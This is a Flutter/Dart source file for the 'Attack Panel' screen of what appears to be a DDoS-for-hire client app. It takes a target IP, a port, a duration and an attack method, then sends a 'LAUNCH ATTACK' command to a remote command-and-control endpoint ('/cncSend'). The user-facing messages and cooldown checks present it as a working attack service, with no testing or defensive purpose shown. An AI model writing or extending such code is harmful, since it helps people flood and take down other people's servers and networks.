import 'config.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final String baseUrl = "$apiBaseUrl";
  late AnimationController _controller;
  String selectedDoosId = "";
  double attackDuration = 60;

  // --- Konstanta Warna Tema (UBAHAN: TEMA UNGU) ---
  final Color primaryDark = const Color(0xFFCED4DA);
  final Color primaryWhite = Colors.black87;
  final Color accentPurple = const Color(0xFFFF99AC); // Warna aksen utama (Putih)
  final Color cardDark = const Color(0xFFF8F9FA); // Warna kartu dengan tint biru-hitam

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    if (widget.listDoos.isNotEmpty) {
      selectedDoosId = widget.listDoos[0]['ddos_id'];
    }
  }

  Future<void> _sendDoos() async {
    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (target.isEmpty || key.isEmpty) {
      _showAlert("❌ Invalid Input", "Target IP cannot be empty.");
      return;
    }

    if (selectedDoosId != "icmp" && (port.isEmpty || int.tryParse(port) == null)) {
      _showAlert("❌ Invalid Port", "Please input a valid port.");
      return;
    }

    try {
      final uri = Uri.parse(
          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri);
      final data = jsonDecode(res.body);
      debugPrint(data.toString());

      if (data["cooldown"] == true) {
        _showAlert("⏳ Cooldown", "Please wait a moment before sending again.");
      } else if (data["valid"] == false) {
        _showAlert("❌ Invalid Key", "Your session key is invalid. Please log in again.");
      } else if (data["sended"] == false) {
        _showAlert("⚠️ Failed", "Failed to send attack. The server may be under maintenance.");
      } else {
        _showAlert("✅ Success", "Attack has been successfully sent to $target.");
      }
    } catch (_) {
      _showAlert("❌ Error", "An unexpected error occurred. Please try again.");
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardDark,
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: accentPurple) // Border diubah ke ungu
        ),
        title: Text(title, style: TextStyle(color: primaryWhite, fontFamily: 'Orbitron')),
        content: Text(msg, style: TextStyle(color: primaryWhite.withOpacity(0.7), fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("OK", style: TextStyle(color: accentPurple)), // Tombol OK diubah ke ungu
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
    return Scaffold(
      backgroundColor: primaryDark,
      appBar: AppBar(
        backgroundColor: primaryDark,
        elevation: 0,
        title: const Text(
          "🚀 Attack Panel",
          style: TextStyle(
            fontFamily: 'Orbitron',
            fontWeight: FontWeight.bold,
            color: Colors.black87,
          ),
        ),
        centerTitle: true,
      ),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(
            children: [
              FadeTransition(
                opacity: Tween(begin: 0.5, end: 1.0).animate(_controller),
                child: ClipOval(
                  child: Image.asset(
                    'assets/images/logo.png',
                    width: 120,
                    height: 120,
                    fit: BoxFit.cover,
                  ),
                ),
              ),
              const SizedBox(height: 20),
              Text(
                "Target Input & Methods",
                style: TextStyle(
                  color: primaryWhite,
                  fontFamily: 'Orbitron',
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                ),
              ),
              Divider(color: accentPurple, thickness: 0.6), // Divider diubah ke ungu
              const SizedBox(height: 25),

              // === Target Input Card ===
              _buildInputCard(
                icon: Icons.computer,
                title: "Target IP",
                child: TextField(
                  controller: targetController,
                  style: TextStyle(color: primaryWhite),
                  cursorColor: accentPurple, // Kursor diubah ke ungu
                  decoration: _inputStyle("Target IP (e.g. 1.1.1.1)"),
                ),
              ),
              const SizedBox(height: 20),

              // === Port Input Card ===
              _buildInputCard(
                icon: Icons.wifi_tethering,
                title: "Port",
                child: TextField(
                  controller: portController,
                  enabled: !isIcmp,
                  keyboardType: TextInputType.number,
                  style: TextStyle(color: isIcmp ? Colors.grey : primaryWhite),
                  cursorColor: isIcmp ? Colors.grey : accentPurple,
                  decoration: _inputStyle(
                    isIcmp ? "ICMP does not use port" : "Port (e.g. 80)",
                    isIcmp: isIcmp,
                  ),
                ),
              ),
              const SizedBox(height: 20),

              // === Duration Slider ===
              _buildInputCard(
                icon: Icons.timer,
                title: "Attack Duration",
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text("⏱ ${attackDuration.toInt()} seconds",
                        style: TextStyle(color: primaryWhite.withOpacity(0.7), fontSize: 14)),
                    Slider(
                      value: attackDuration,
                      min: 10,
                      max: 300,
                      divisions: 29,
                      label: "${attackDuration.toInt()}s",
                      activeColor: accentPurple, // Slider aktif diubah ke ungu
                      inactiveColor: primaryWhite.withOpacity(0.1),
                      onChanged: (value) {
                        setState(() => attackDuration = value);
                      },
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 20),

              // === Dropdown Attack Methods ===
              _buildInputCard(
                icon: Icons.flash_on,
                title: "Attack Method",
                child: DropdownButtonHideUnderline(
                  child: DropdownButton<String>(
                    dropdownColor: cardDark,
                    value: selectedDoosId,
                    isExpanded: true,
                    iconEnabledColor: accentPurple, // Ikon dropdown diubah ke ungu
                    style: TextStyle(color: primaryWhite),
                    items: widget.listDoos.map((doos) {
                      return DropdownMenuItem<String>(
                        value: doos['ddos_id'],
                        child: Text(
                          doos['ddos_name'],
                          style: TextStyle(color: primaryWhite),
                        ),
                      );
                    }).toList(),
                    onChanged: (value) {
                      setState(() {
                        selectedDoosId = value!;
                      });
                    },
                  ),
                ),
              ),
              const SizedBox(height: 40),

              // === Send Button ===
              SizedBox(
                width: double.infinity,
                child: ElevatedButton.icon(
                  onPressed: _sendDoos,
                  icon: Icon(Icons.bolt, color: primaryWhite),
                  label: Text(
                    "LAUNCH ATTACK",
                    style: TextStyle(
                      fontSize: 16,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1.2,
                      color: primaryWhite,
                    ),
                  ),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: accentPurple, // Tombol utama diubah ke ungu
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                    elevation: 6,
                    shadowColor: accentPurple.withOpacity(0.6), // Bayangan diubah ke ungu
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInputCard({required IconData icon, required String title, required Widget child}) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: cardDark,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: accentPurple.withOpacity(0.5), width: 1), // Border diubah ke ungu
        boxShadow: [
          BoxShadow(
            color: accentPurple.withOpacity(0.2), // Bayangan diubah ke ungu
            blurRadius: 8,
            spreadRadius: 1,
          )
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(icon, color: accentPurple, size: 20), // Ikon judul diubah ke ungu
              const SizedBox(width: 8),
              Text(title,
                  style: TextStyle(color: primaryWhite, fontWeight: FontWeight.bold)),
            ],
          ),
          const SizedBox(height: 10),
          child,
        ],
      ),
    );
  }

  InputDecoration _inputStyle(String hint, {bool isIcmp = false}) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(color: isIcmp ? Colors.grey : accentPurple), // Hint teks diubah ke ungu
      filled: true,
      fillColor: primaryDark,
      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      enabledBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isIcmp ? Colors.grey : accentPurple), // Border diubah ke ungu
        borderRadius: BorderRadius.circular(16),
      ),
      focusedBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isIcmp ? Colors.grey : accentPurple), // Border fokus diubah ke ungu
        borderRadius: BorderRadius.circular(16),
      ),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    targetController.dispose();
    portController.dispose();
    super.dispose();
  }
}